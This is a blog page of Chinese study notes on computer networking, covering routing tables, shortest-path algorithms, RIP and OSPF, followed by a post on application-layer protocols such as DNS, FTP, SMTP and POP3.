<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[Huawei]display ip routing-table</span><br><span class="line">Route Flags: R - relay, D - download to fib</span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line">Routing Tables: Public</span><br><span class="line">         Destinations : 2        Routes : 2        </span><br><span class="line"></span><br><span class="line">Destination/Mask    Proto   Pre  Cost      Flags NextHop         Interface</span><br><span class="line"></span><br><span class="line">      127.0.0.0/8   Direct  0    0           D   127.0.0.1       InLoopBack0</span><br><span class="line">      127.0.0.1/32  Direct  0    0           D   127.0.0.1       InLoopBack0</span><br></pre></td></tr></table></figure>
<p>两者的主要区别就是这个NextHop</p>
<p>主机的网卡不需要下一跳地址,只需要维护一个网关的地址</p>
<p>路由器需要维护下一条的地址</p>
<h5 id="最长掩码匹配">最长掩码匹配</h5>
<p>从路由表中选择具有最长掩码的路由</p>
<p>掩码越长,地址块越小,路由越具体</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212163420071.png"
alt="image-20230212163420071" />
<figcaption aria-hidden="true">image-20230212163420071</figcaption>
</figure>
<p>假如R2路由器收到了一个目的地址为140.24.7.192的地址,</p>
<p>该目的地址即属于140.24.7.192/26网段,</p>
<p>又属于140.24.7.0/24网段,</p>
<p>应该发往最长具有掩码的网段,即140.24.7.192/26</p>
<h5 id="地址聚合">地址聚合</h5>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212163621450.png"
alt="image-20230212163621450" />
<figcaption aria-hidden="true">image-20230212163621450</figcaption>
</figure>
<h5 id="默认路由">默认路由</h5>
<p>默认路由就这种</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221107113423289.png"
alt="image-20221107113423289" />
<figcaption aria-hidden="true">image-20221107113423289</figcaption>
</figure>
<p>子网掩码是0,意味着默认路由在路由表中排在最后,也就是最后的选择.</p>
<p>只要是前面都失配的包都会从默认路由这里匹配成功.该条记录只需要记录从本路由器中的哪个端口出去,下一条是谁</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221107113605164.png"
alt="image-20221107113605164" />
<figcaption aria-hidden="true">image-20221107113605164</figcaption>
</figure>
<p>比如这里的B路由器,除了10.1.0.0/24,其他的包只能发往C路由器,于是B-&gt;C这条路由就是B的默认路由</p>
<h4 id="路由协议优先级">路由协议优先级</h4>
<p>直连路由的优先级最高,因为 其最可靠</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221107112300287.png"
alt="image-20221107112300287" />
<figcaption aria-hidden="true">image-20221107112300287</figcaption>
</figure>
<p>IP路由表为路由器实际工作时使用的路由表</p>
<p>建立该表的过程中可能考虑了很多路由协议,比如RIP,OSPF,对于同一个Destination的路由记录,优先使用高优先级路由协议给出的路由记录</p>
<p>比如之类对于24.10.0/24这个地址,RIP和OSPF两种协议给出了不同的下一跳,必然有优劣.由于OSPF协议的优先级高,最终写入IP路由表的,来自OSPF协议</p>
<h4 id="路由算法">路由算法</h4>
<h5 id="dijkstra">dijkstra</h5>
<p>边权是链路代价,两节点不连接时链路代价为无穷大</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212163803322.png"
alt="image-20230212163803322" />
<figcaption aria-hidden="true">image-20230212163803322</figcaption>
</figure>
<p>符号约定:</p>
<table>
<thead>
<tr>
<th>符号</th>
<th>意义</th>
</tr>
</thead>
<tbody>
<tr>
<td>T</td>
<td>已经"拓展"的节点集合</td>
</tr>
<tr>
<td>N</td>
<td>网络中的节点集合</td>
</tr>
<tr>
<td>s</td>
<td>源点</td>
</tr>
<tr>
<td>w(i,j)</td>
<td>从i到j节点的链路代价</td>
</tr>
<tr>
<td>L(i)</td>
<td>目前从源点s到i节点的最小代价</td>
</tr>
</tbody>
</table>
<p>以1号节点为起点,计算其与其他所有点的最短距离</p>
<p>计算过程:</p>
<table>
<colgroup>
<col style="width: 5%" />
<col style="width: 22%" />
<col style="width: 7%" />
<col style="width: 5%" />
<col style="width: 7%" />
<col style="width: 8%" />
<col style="width: 7%" />
<col style="width: 5%" />
<col style="width: 7%" />
<col style="width: 6%" />
<col style="width: 7%" />
<col style="width: 8%" />
</colgroup>
<thead>
<tr>
<th>Iter</th>
<th><em>T</em></th>
<th><em>L</em>(2)</th>
<th>Path</th>
<th><em>L</em>(3)</th>
<th>Path</th>
<th><em>L</em>(4)</th>
<th>Path</th>
<th><em>L</em>(5)</th>
<th>Path</th>
<th><em>L</em>(6)</th>
<th>Path</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>{1}</td>
<td>2</td>
<td>1-2</td>
<td>5</td>
<td>1-3</td>
<td>1</td>
<td>1-4</td>
<td>∞</td>
<td>-</td>
<td>∞</td>
<td>-</td>
</tr>
<tr>
<td>2</td>
<td>{1,4}</td>
<td>2</td>
<td>1-2</td>
<td>4</td>
<td>1-4-3</td>
<td>1</td>
<td>1-4</td>
<td>2</td>
<td>1-4-5</td>
<td>∞</td>
<td>-</td>
</tr>
<tr>
<td>3</td>
<td>{1, 2, 4}</td>
<td>2</td>
<td>1-2</td>
<td>4</td>
<td>1-4-3</td>
<td>1</td>
<td>1-4</td>
<td>2</td>
<td>1-4-5</td>
<td>∞</td>
<td>-</td>
</tr>
<tr>
<td>4</td>
<td>{1, 2, 4, 5}</td>
<td>2</td>
<td>1-2</td>
<td>3</td>
<td>1-4-5-3</td>
<td>1</td>
<td>1-4</td>
<td>2</td>
<td>1-4-5</td>
<td>4</td>
<td>1-4-5-6</td>
</tr>
<tr>
<td>5</td>
<td>{1, 2, 3, 4, 5}</td>
<td>2</td>
<td>1-2</td>
<td>3</td>
<td>1-4-5-3</td>
<td>1</td>
<td>1-4</td>
<td>2</td>
<td>1-4-5</td>
<td>4</td>
<td>1-4-5-6</td>
</tr>
<tr>
<td>6</td>
<td>{1, 2, 3, 4, 5, 6}</td>
<td>2</td>
<td>1-2</td>
<td>3</td>
<td>1-4-5-3</td>
<td>1</td>
<td>1-4</td>
<td>2</td>
<td>1-4-5</td>
<td>4</td>
<td>1-4-5-6</td>
</tr>
</tbody>
</table>
<h5 id="bellmanford">bellmanford</h5>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212163803322.png"
alt="image-20230212163803322" />
<figcaption aria-hidden="true">image-20230212163803322</figcaption>
</figure>
<p><span
class="math inline">\(L_h(i)\)</span>从源点到i点,最多经过h条链路时,最小链路代价和</p>
<p>计算过程</p>
<table style="width:100%;">
<colgroup>
<col style="width: 5%" />
<col style="width: 11%" />
<col style="width: 5%" />
<col style="width: 11%" />
<col style="width: 9%" />
<col style="width: 11%" />
<col style="width: 5%" />
<col style="width: 11%" />
<col style="width: 7%" />
<col style="width: 11%" />
<col style="width: 9%" />
</colgroup>
<thead>
<tr>
<th><em>h</em></th>
<th><span class="math inline">\(L_h(2)\)</span></th>
<th>Path</th>
<th><span class="math inline">\(L_h(3)\)</span></th>
<th>Path</th>
<th><span class="math inline">\(L_h(4)\)</span></th>
<th>Path</th>
<th><span class="math inline">\(L_h(5)\)</span></th>
<th>Path</th>
<th><span class="math inline">\(L_h(6)\)</span></th>
<th>Path</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>∞</td>
<td>-</td>
<td>∞</td>
<td>-</td>
<td>∞</td>
<td>-</td>
<td>∞</td>
<td>-</td>
<td>∞</td>
<td>-</td>
</tr>
<tr>
<td>1</td>
<td>2</td>
<td>1-2</td>
<td>5</td>
<td>1-3</td>
<td>1</td>
<td>1-4</td>
<td>∞</td>
<td>-</td>
<td>∞</td>
<td>-</td>
</tr>
<tr>
<td>2</td>
<td>2</td>
<td>1-2</td>
<td>4</td>
<td>1-4-3</td>
<td>1</td>
<td>1-4</td>
<td>2</td>
<td>1-4-5</td>
<td>10</td>
<td>1-3-6</td>
</tr>
<tr>
<td>3</td>
<td>2</td>
<td>1-2</td>
<td>3</td>
<td>1-4-5-3</td>
<td>1</td>
<td>1-4</td>
<td>2</td>
<td>1-4-5</td>
<td>4</td>
<td>1-4-5-6</td>
</tr>
<tr>
<td>4</td>
<td>2</td>
<td>1-2</td>
<td>3</td>
<td>1-4-5-3</td>
<td>1</td>
<td>1-4</td>
<td>2</td>
<td>1-4-5</td>
<td>4</td>
<td>1-4-5-6</td>
</tr>
</tbody>
</table>
<h4 id="动态路由协议">动态路由协议</h4>
<p>动态路由协议的目的:</p>
<p>知道有哪些邻居路由器；</p>
<p>能够学习到网络中有哪些网段；</p>
<p>能够学习到至某个网段的所有路径；</p>
<p>能够从众多的路径中选择最佳的路径；</p>
<p>能够维护和更新路由信息。</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221114110756904.png"
alt="image-20221114110756904" />
<figcaption aria-hidden="true">image-20221114110756904</figcaption>
</figure>
<h5 id="自治系统">自治系统</h5>
<p>每个自治系统内部使用一套相同的路由协议,同级的自治系统使用同一套路由协议,自治系统可以嵌套自治系统</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212170909097.png"
alt="image-20230212170909097" />
<figcaption aria-hidden="true">image-20230212170909097</figcaption>
</figure>
<p>每个自治系统都要分配一个AS号,用于路由</p>
<p>本级自治系统只负责将本级的IP分组发往本级目标自治系统,剩下具体发往目标AS中的哪一台主机,<strong>由该AS内部的路由协议自己决定</strong></p>
<h5 id="rip-on-距离向量算法">RIP on 距离向量算法</h5>
<p>RIP协议基于距离向量协议</p>
<p>RIP协议中的距离或者说代价,就是跳数</p>
<p>Distance vector,距离向量算法</p>
<p>每个节点都有一个</p>
<h6 id="初始化">初始化</h6>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221114110945325.png"
alt="image-20221114110945325" />
<figcaption aria-hidden="true">image-20221114110945325</figcaption>
</figure>
<p>最初的拓扑中,每个路由器都只知道与自己直连的路由器.其路由表中只有这些路由器的信息</p>
<p>比如D实际上式不知道B的存在的,它只知道A的存在.上图中的D的路由表中画出
BCE,但是距离是<span
class="math inline">\(\infin\)</span>,就相当于不知道它的存在</p>
<h6 id="共享路由信息距离向量更新">共享路由信息&amp;距离向量更新</h6>
<p>周期共享</p>
<p>每个结点都会将自己知道的所有都告诉邻居</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221114111341938.png"
alt="image-20221114111341938" />
<figcaption aria-hidden="true">image-20221114111341938</figcaption>
</figure>
<p>这里C共享给A的所有信息都要代价+2,这是AC之间的边权</p>
<p>C发往A的所有信息,其Next都是C,意思是,如果A需要使用该表中的一些信息,一定是C的贡献,届时A会以C作为下一跳发送相应数据包</p>
<p>A的老路由表和加上AC边权代价之后的C共享表进行比较,每一条路由都取Cost最小值,得到新路由表</p>
<h6 id="缺点">缺点:</h6>
<p>两个节点的不稳定性</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221114111751153.png"
alt="image-20221114111751153" />
<figcaption aria-hidden="true">image-20221114111751153</figcaption>
</figure>
<p>当A与X之间的链路断开后,A到X的距离成为无穷大,如果因为丢包等原因,A没有及时通知B,X已经断开了,那么B就一直认为B-&gt;A-&gt;X这条链路正常.当B给A交换路由信息的时候,A又认为B还有其他通路到X(实际上就是之前的链路).于是A有到X的包就会发往B,B又发往A,A又发往B...</p>
<p>三个节点的不确定性:</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212172241217.png"
alt="image-20230212172241217" />
<figcaption aria-hidden="true">image-20230212172241217</figcaption>
</figure>
<p>X已经不和ABC连接了,A一开始也是知道X已经离开的,但是经过共享后,ABC都糊涂了</p>
<h6 id="基于距离向量的rip协议">基于距离向量的RIP协议</h6>
<p>就是将链路代价换成跳数</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212173742433.png"
alt="image-20230212173742433" />
<figcaption aria-hidden="true">image-20230212173742433</figcaption>
</figure>
<h5 id="ospf-on-链路状态路由选择算法">OSPF on 链路状态路由选择算法</h5>
<p>链路状态:</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212182013525.png"
alt="image-20230212182013525" />
<figcaption aria-hidden="true">image-20230212182013525</figcaption>
</figure>
<p>每个节点都知道一些链路信息,比如链路代价,连接状态</p>
<p>每个节点都会字节建立一张路由表,通过洪范向其他节点广播状态</p>
<p>每个节点自己构建一个最短路径树,并以此构建路由表</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212182406755.png"
alt="image-20230212182406755" />
<figcaption aria-hidden="true">image-20230212182406755</figcaption>
</figure>
<p>最短路径树:</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212182518356.png"
alt="image-20230212182518356" />
<figcaption aria-hidden="true">image-20230212182518356</figcaption>
</figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2023/02/12/%E5%BA%94%E7%94%A8%E5%B1%82/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/12/%E5%BA%94%E7%94%A8%E5%B1%82/" class="post-title-link" itemprop="url">计算机网络-应用层</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-02-12 18:28:00 / Modified: 18:29:11" itemprop="dateCreated datePublished" datetime="2023-02-12T18:28:00+08:00">2023-02-12</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="应用层">应用层</h1>
<p>[TOC]</p>
<h2 id="应用层概览">应用层概览:</h2>
<figure>
<img
src="https://img-blog.csdnimg.cn/img_convert/3b83510e49c73908a1d9433b7e14bccc.png"
alt="image-20220115220640203" />
<figcaption aria-hidden="true">image-20220115220640203</figcaption>
</figure>
<p><strong>熟知端口号:应用层协议在服务端的==默认==端口号,客户端端口号随意</strong></p>
<p><img
src="https://img-blog.csdnimg.cn/img_convert/8cbd969af94815b2a77969b48c049707.png" /></p>
<h2 id="网络应用模型">网络应用模型</h2>
<h3 id="客户服务器模型">客户/服务器模型</h3>
<figure>
<img
src="https://img-blog.csdnimg.cn/img_convert/32549a6e2bec5e8e8adbb7c6c645d055.png"
alt="image-20220115215144534" />
<figcaption aria-hidden="true">image-20220115215144534</figcaption>
</figure>
<h4 id="工作流程">工作流程:</h4>
<p>1.服务器处于接收请求的状态</p>
<p>2.客户机发出服务请求,等待接收结果</p>
<p>3.服务器收到请求后分析请求,进行必要的处理,返回给客户端</p>
<p>客户端必须事先直到服务端的IP地址,这通过DNS解析完成</p>
<p>服务端处于被动状态,谁来了给谁服务,不来的不管</p>
<h4 id="特点">特点:</h4>
<p>1.计算机第位不对等,服务器可以限制用户权限,比如ftp协议中ftp服务器可以设置管理员Administrator拥有读写的权力,但是匿名用户只有读的权力</p>
<p>2.客户机之间不直接通信</p>
<p>3.可拓展性差,服务器性能决定一切,服务器能力有限,想要服务更多的用户需要更强的服务器</p>
<h3 id="p2p模型">P2P模型</h3>
<p>peer to peer</p>
<p>这个2的英语是two与to同音</p>
<p>(曾经)比较流行的p2p应用有 电驴 等等</p>
<figure>
<img
src="https://img-blog.csdnimg.cn/img_convert/9781d4260d4e18bd79619b14134d7389.png"
alt="image-20220115215157997" />
<figcaption aria-hidden="true">image-20220115215157997</figcaption>
</figure>
<h4 id="特点-1">特点</h4>
<p>1.计算机第位对等,任意一对计算机可以直接通信,减轻了服务器的压力,提高了效率和资源利用率</p>
<blockquote>
<p>P2P模型实质上依然是C/S方式,A与B通信时A发送消息,B接收消息,A就是客户端,B就是服务端.</p>
<p>只不过没有了专门的服务器一说</p>
</blockquote>
<p>2.可拓展性好</p>
<p>3.网络健壮性强,单个节点失效一般不会影响其他部分</p>
<p>4.拥塞网络等缺点导致目前ISP(Internet Server
Provider互联网服务供应商)对P2P模式持反对态度</p>
<h2 id="域名系统dns">域名系统(DNS)</h2>
<p>domain name system</p>
<p>采用客户/服务器模型,协议运行在UDP之上,采用53号端口</p>
<h3 id="层次域名空间">层次域名空间</h3>
<p><img
src="https://img-blog.csdnimg.cn/img_convert/0523696b731624567596ee5ee0e43614.png" /></p>
<blockquote>
<p>域名命名规则</p>
<p><img
src="https://img-blog.csdnimg.cn/img_convert/5c5251f0e93aaed372842f55a4ccd2ba.png" /></p>
</blockquote>
<p><img
src="https://img-blog.csdnimg.cn/img_convert/682ab6339aec5c26d7dff29abc2e0285.png" /></p>
<h3 id="域名服务器">域名服务器</h3>
<p>域名系统实际上是一个联机分布的数据库系统,采用C/S模型</p>
<p>域名到IP地址的解析实在域名服务器完成的</p>
<p>一个域名服务器所管辖的域名范围称为区,同一个区中的各个节点一定联通</p>
<p>每个区设置相应的权限域名服务器,保存该区中所有计算机域名到IP地址的映射</p>
<p>每个域名服务器还应当有连向其他域名服务器的信息,当某个域名不在自己的管辖范围内时本域名服务器应当知道去哪里解析</p>
<h3 id="域名服务器的组织方式">域名服务器的组织方式</h3>
<p>域名服务器以层次方式组织</p>
<p><img
src="https://img-blog.csdnimg.cn/img_convert/8c08cd3b1c1fbb14a0ab547cb765e8fb.png" /></p>
<h4 id="根域名服务器">根域名服务器</h4>
<p>最高层次的域名服务器,根域名服务器知道所有顶级域名服务器的IP地址</p>
<p>当本地域名服务器无法解析时首先询问根域名服务器</p>
<p>根域名服务器告诉本地域名服务器下一步应当找哪一个顶级域名服务器进行查询</p>
<h4 id="顶级域名服务器">顶级域名服务器</h4>
<p>管辖在该顶级域名服务器下注册的所有二级域名</p>
<p>当收到其他服务器的DNS查询请求时返回当前域名或者下一级域名服务器的IP地址</p>
<h4 id="授权域名服务器">授权域名服务器</h4>
<p>==每台主机==都必须在授权域名服务器处登记</p>
<p>为了可靠性,一台主机最好有两个以上的授权域名服务器(类似于留多个联系方式,方便找你)</p>
<p>许多域名服务器同时充当本地域名服务器和授权域名服务器</p>
<blockquote>
<p>这句话我的理解是==路由器==</p>
<p>即充当本地主机向外网发起DNS查询请求的本地域名服务器的功能,</p>
<p>又起到了外网查询本机IP的授权域名服务器的功能</p>
</blockquote>
<h4 id="本地域名服务器">本地域名服务器</h4>
<blockquote>
<p>个人感觉类似局域网的域名服务器</p>
</blockquote>
<p>任何主机发出DNS查询请求时都需要首先送到本地域名服务器</p>
<p>本地链接填写的IP地址就是本地域名服务器地址</p>
<p>本地域名服务器记录根域名服务器的地址</p>
<h3 id="解析器">解析器</h3>
<p>域名解析是把域名映射为IP地址或者把IP地址映射为域名的过程.</p>
<p>当客户端需要域名解析时,本地DNS客户端构造一个DNS请求报文以UDP数据包方式发往本地域名服务器</p>
<p>正向解析:域名映射为IP地址</p>
<p>反向解析:IP地址映射为域名</p>
<p>解析方式有两种:递归查询和递归与迭代相结合的查询</p>
<p><img
src="https://img-blog.csdnimg.cn/img_convert/8c026d23dfadc4803f73767aead7b400.png" /></p>
<h4
id="递归解析过程解析y.abc.com的ip地址">递归解析过程解析y.abc.com的IP地址</h4>
<p>1.主机首先查询本机的高速缓存,没有找到y.abc.com的查询记录,于是将DNS解析请求报文发送给本地域名服务器.</p>
<p>2.本地域名服务器首先检查高速缓存,没有找到y.abc.com的查询记录,于是将DNS解析请求报文发送给根域名服务器</p>
<p>3.根域名服务器首先检查高速缓存,没有找到y.abc.com的查询记录,于是将DNS解析请求报文发送给.com顶级域名服务器</p>
<p>4..com顶级域名服务器高速缓存也没有,于是将DNS解析请求报文发送给.abc.com权限域名服务器</p>
<p>5..abc.com权限域名服务器下恰好有一个注册域名为y.abc.com的主机,于是返回该主机的IP地址给上级.com顶级域名服务器</p>
<p>6..com顶级域名服务器收到.abc.com权限域名服务器的返回IP之后将该IP再返回给根域名服务器,同时在高速缓存中记录该查询记录,方便下次查询时避免递归</p>
<p>7.根域名服务器将.com返回的IP地址再返回给本地域名服务器,同时在高速缓存中记录该查询</p>
<p>8.本地域名服务器收到根域名服务器返回的IP地址,将该IP地址返回给发起请求的主机,并在高速缓存中记录该查询</p>
<p>9.发起请求的主机最终得到了y.abc.com的IP地址,并在本机的高速缓存中记录该查询</p>
<blockquote>
<p>高速缓存的作用?</p>
<p>如果主机刚才已经查询过y.abc.com的IP地址并且存储于高速缓存中,那么==不久后==的再次查询就可以直接从高速缓存中取记录,而不用再递归一大圈去找这个IP地址</p>
<p>为什么每一级服务器都需要高速缓存?</p>
<p>类似于记忆化搜索,本地域名服务器不一定只服务于一台主机,如果主机A,B都由本地域名服务器S提供服务,假设A解析了主机C,S会将C的IP地址存在高速缓存中,那么当B也需要查询C时本地域名服务器只需要返回刚才的记录</p>
</blockquote>
<p>缺点:</p>
<p>不考虑高速缓存的作用,每一次跨本地域名服务器的DNS查询都需要根域名服务器的介入,而世界上只有13台根服务器,但是却要面对上亿的主机和查询,根服务器将会不堪重负</p>
<p>改进方法:递归+迭代</p>
<h4
id="递归与迭代相结合的解析过程解析y.abc.com的ip地址">递归与迭代相结合的解析过程解析y.abc.com的IP地址</h4>
<p>本地主机还是以解析y.abc.com的IP地址为例子,假设路径上服务器的高速缓存都没有存储该查询记录</p>
<p>1.本机向本地域名服务器发起DNS查询报文</p>
<p>2.本地域名服务器发现该DNS不在局域网内,需要向外网寻找,于是直接向根域名服务器发出请求</p>
<p>3.根服务器返回.com顶级服务器的IP地址</p>
<p>4.本地域名服务器收到.com的IP地址后向该.com顶级域名服务器发送请求</p>
<p>5..com顶级域名服务器返回.abc.com授权域名服务器地址</p>
<p>6.本地域名服务器收到.abc.com的IP地址后向该授权域名服务器发送请求</p>
<p>7..abc.com授权域名服务器返回y.abc.com的IP地址</p>
<p>8.本地域名服务器已经获得了y.abc.com的IP地址"我滴任务完成辣!啊哈哈哈哈",然后将该IP地址返回给发起请求的本机</p>
<p>相对于递归方式,递归+迭代的方式中,根服务器,顶级域名服务器等被询问的服务器都没法在高速缓存上记录这次查询,因为他们都是的==指路人==而不是==带路人==的作用.</p>
<h2 id="文本传输协议ftp">文本传输协议FTP</h2>
<p>File Transfer Protocol,因特网上使用最广泛的文件传输协议</p>
<p>功能:</p>
<p>1.兼容:不同种类(包括硬件软件)主机系统之间传输文件</p>
<p>2.权限:以用户权限管理的方式提供用户对远程FTP服务器上的文件管理能力</p>
<p>3.匿名共享:匿名FTP方式提供公用文件共享的negligence</p>
<h3 id="ftp工作原理">FTP工作原理</h3>
<p>采用C/S工作方式,使用TCP可靠的传输服务.</p>
<p>一个FTP服务器进程可以同时为多个客户进程提供服务(分时系统?)</p>
<p>FTP服务器进程分两大部分:</p>
<p>主进程:接受新的请求,处于一直监听的状态,只要有新的进程就立刻开一个从属进程来啊处理该请求</p>
<p>从属进程:处理单个请求</p>
<p>以主机A下载<code>ftp://ftp.abc.edu.cn/file</code>为例子描述工作过程</p>
<p>1.服务端开放21号端口,并监听这个端口,等待客户连接.</p>
<p>2.客户端开放随意端口连接到服务端的21号端口,建立控制连接</p>
<p>3.客户端通过控制连接发送下载文件的请求</p>
<blockquote>
<p>控制信息时7位ASCII码格式</p>
<p>控制连接只用来控制,不用来传输</p>
<p>数据连接和控制连接并行,即使是传输过程中也可以通过控制连接发送停止请求中止数据传输</p>
</blockquote>
<p>4.服务端接收到文件传输请求后,创建"数据传输进程"和"数据连接",在20号端口与客户端的任意端口(区别于客户端刚才开放的控制连接端口)建立数据连接并且传输客户端请求的文件</p>
<p>5.当客户端的一次数据传输请求被满足时,服务端立刻关闭20端口,断开数据连接.控制连接继续接收用户的传输请求</p>
<h3 id="ftp服务特点">FTP服务特点:</h3>
<p>1.提供不同种类的主机系统之间的文件传输能力</p>
<p>2.以用户权限管理的方式提供用户对远程FTP服务器上的文件的管理能力</p>
<p>3.以匿名FTP方式提供公用文件共享的能力.匿名用户只能从FTP服务器拷贝文件,不能上传或者修改文件,即只读模式</p>
<p>4.使用TCP协议.</p>
<p>5.一个FTP服务器进程可以同时为多个客户进程提供服务</p>
<p>6.带外传送,使用两种连接,控制连接和数据连接.分别占用21和20端口,其中数据连接传送完毕之后立刻断开,控制连接一直持续</p>
<p>7.服务器必须追踪用户在远程目录树上的当前位置</p>
<h2 id="电子邮件">电子邮件</h2>
<h3 id="组成结构">组成结构</h3>
<p><img
src="https://img-blog.csdnimg.cn/img_convert/ac055e43baff6eafbde1f574ff0b617f.png" /></p>
<p>异步通信方式,通信时双方都不需要在场</p>
<p>发送和接收实际是由邮件服务器完成的</p>
<p>用户的工作是通过用户代理命令邮件服务器完成工作</p>
<h4 id="用户代理">用户代理:</h4>
<p>User Agent</p>
<p><strong>"用户与电子邮件系统的接口"</strong></p>
<p>说人话就是电子邮箱,比如qq邮箱.</p>
<blockquote>
<p>用户发送邮件时在网络上的形象</p>
<p>人类在工作时的形象是工人,人类在教书时的形象是老师,人类在发送邮件时的形象是邮箱</p>
</blockquote>
<p>显然这个用户代理能够实现人类希望的,最起码的写信,显示,处理信的功能</p>
<h4 id="邮件服务器">邮件服务器</h4>
<blockquote>
<p>电子邮件系统中的工具人儿,是用户代理的奴仆</p>
</blockquote>
<p>作用是:</p>
<p>1.收发邮件</p>
<p>2.向用户代理报告邮件传送情况</p>
<p>采用C/S方式工作</p>
<p>一个邮件服务器本身是双料高级特工,在它==发送邮件时他是客户端C,==在它==接收邮件的时候,它是服务端S==</p>
<blockquote>
<p>用实际生活中收发邮件做一个类比</p>
<p><img
src="https://img-blog.csdnimg.cn/img_convert/082dfb6a4adc8633ff832af17b26042c.png" /></p>
<p>实际生活中接收邮件是比较类似于网上这一套的,每天早上我们起床之后出门检查一下私人邮箱里面是否有东西,从家里走出来到邮箱取邮件这一段是我们亲历亲为的,没法生动地解释用户代理这个概念</p>
<p>并且对于发送邮件,实际生活中我们需要跑好远到邮局或者偶遇邮递员送信,但是网络上我们却用的与收信相同的邮箱.这是天壤之别.</p>
<p>为了方便理解这件事,我们虚构一个"现实":</p>
<p>1.我家有矿,收发邮件这种琐事怎么可能由我自己跑腿?雇一个管家专门代替我从屋门到邮箱这两三步的距离.</p>
<p>并且我不识字儿,写信也是我口述,管家代笔,我说错了要改,管家也不会烦,无条件服从我的命令.</p>
<p>收信我也不自己看,管家念给我听.</p>
<p>附近邻居家的情况与我相同</p>
<p>这个管家就比较类似与用户代理了</p>
<p>2.邮箱是==公共的==,并且这个邮箱好大,为每个用户都留了存放信件的地方,周围的邻居收发信件都通过这个邮箱,</p>
<p>每个邮箱都是邮局的功能,我发邮件不需要到邮局发,我只需要让管家写好信放在邮箱里.</p>
<p>每隔一段时间邮箱就会自己检查有没有待发送的邮件,</p>
<p>如果有,则召唤邮递员,让邮递员先不送信,屁颠屁颠地跑到目的地看看沿路能不能通,对方的邮箱能不能接收邮件</p>
<p>邮递员逛一圈回来报告都没有问题,邮箱就让邮递员正式送信</p>
<p>邮递员不管送信成功失败都会回来报告给邮箱,并且说明原因</p>
<p>3.邮箱有关于我的消息,比如新的邮件到达或者我发送的邮件成功或者失败等,==不会提醒我==.</p>
<p>只有当我想要了解邮箱有关我的状态时才会吩咐==管家==去邮箱看看==我的那一部分==,回来把消息说给我</p>
<p>这个邮箱就比较类似于邮件服务器了</p>
</blockquote>
<p><strong>记发送端邮件服务器为"客户端"</strong></p>
<p><strong>记接收端邮件服务器为"服务端"</strong></p>
<p>==这两句很重要==</p>
<h4 id="邮件发送协议smtp">邮件发送协议SMTP</h4>
<p>Simple Mail Transfer Protocol简单邮件传输协议</p>
<p>使用C/S方式,发送方为客户端,接收方为服务端.</p>
<p>使用TCP连接,接收方服务器开放端口号25</p>
<blockquote>
<p>浏览器与基于万维网的邮件服务器(Gmail等)之间的邮件发送使用的是HTTP,相同的邮件服务器之间也是HTTP</p>
<p>只有不同邮件服务器之间传送邮件的时候才使用SMTP协议</p>
</blockquote>
<h5 id="多用途国际邮件扩充mime">多用途国际邮件扩充(MIME)</h5>
<p>SMTP只能传送ASCII码,无法实现"添加附件"的功能,于是就有了MIME(Multipurpose
Internet Mail Extensions)</p>
<p>MIME是基于SMTP的,本质上是将用户要发送的"附件"转化为7位ASCII码然后套用SMTP协议,接收方再将ASCII码翻译过来</p>
<p><img
src="https://img-blog.csdnimg.cn/img_convert/dbf93412a69704437e261e04cbc7f9e9.png" /></p>
<p>MIME主要包括:</p>
<p><img
src="https://img-blog.csdnimg.cn/img_convert/5e9e57fdd27d2dd2d0a8cb6820567b4c.png" /></p>
<p><strong>"推"</strong></p>
<p>推的意思是发送方主动,接收方被动</p>
<p>用户代理向==客户端==发送邮件采用的是SMTP协议</p>
<p>客户端向服务端发送邮件采用的也是SMTP协议</p>
<h4 id="邮件读取协议pop3">邮件读取协议POP3</h4>
<p>post office protocol邮局协议,邮件读取协议</p>
<p>3是指第三个版本</p>
